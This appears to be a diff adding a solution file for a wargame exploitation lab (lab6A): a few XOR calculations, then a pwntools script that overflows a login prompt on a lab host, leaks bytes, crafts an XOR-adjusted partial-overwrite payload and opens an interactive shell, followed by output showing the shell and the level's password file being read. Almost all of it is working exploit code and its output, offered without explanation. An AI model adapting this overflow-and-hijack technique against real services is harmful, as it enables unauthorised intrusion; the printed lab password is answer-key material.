@@ -1,0 +1,73 @@
+>>> hex(0x41^0xf1)
+'0xb0'
+>>> hex(0xb0^0x39)
+'0x89
+
+0xfffffff1
+exploit:
+
+
+from pwn import *
+import struct
+
+connect = remote('192.168.56.102',6642)
+connect.recv(500)
+
+user = 'A'*32
+password = 'x'*32
+
+connect.sendline(user)
+connect.recv(500)
+
+connect.sendline(password)
+sleep(1)
+wynik = connect.recv(500)
+
+print "---> HexDump: "
+print hexdump(wynik)
+
+payload = ""
+payload += 'x'*4
+payload += '\x89\x87\x87\x87'
+payload += 'x'*12
+
+after_xor=wynik[0x73:0x77]
+
+print "----------DEBUG--------"
+print after_xor
+
+print hex(ord(after_xor[0]))
+
+
+
+print "----------DEBUG--------"
+
+
+payload += chr(((((ord(after_xor[0])^0x39)&0x00)|0xf4)^0x41)^ord(after_xor[0]))
+payload += chr(((((ord(after_xor[1])^0x39)&0xf0)|0xa)^0x41)^ord(after_xor[1]))
+payload += chr(((ord(after_xor[2])^0x39)^ord(after_xor[2]))^0x41)
+payload += chr(((ord(after_xor[3])^0x39)^ord(after_xor[3]))^0x41)
+
+
+
+payload += 'x'*8
+
+print hexdump(payload)
+
+connect.sendline('A'*32)
+connect.recv(500)
+
+connect.sendline(payload)
+print connect.recv(500)
+
+connect.interactive()
+# connect.close()
+
+WELCOME MR. FALK
+$ id
+uid=1024(lab6A) gid=1025(lab6A) groups=1025(lab6A),1001(gameuser)
+$ cat /home/lab6A/.pass
+strncpy_1s_n0t_s0_s4f3_l0l
+$
+
+
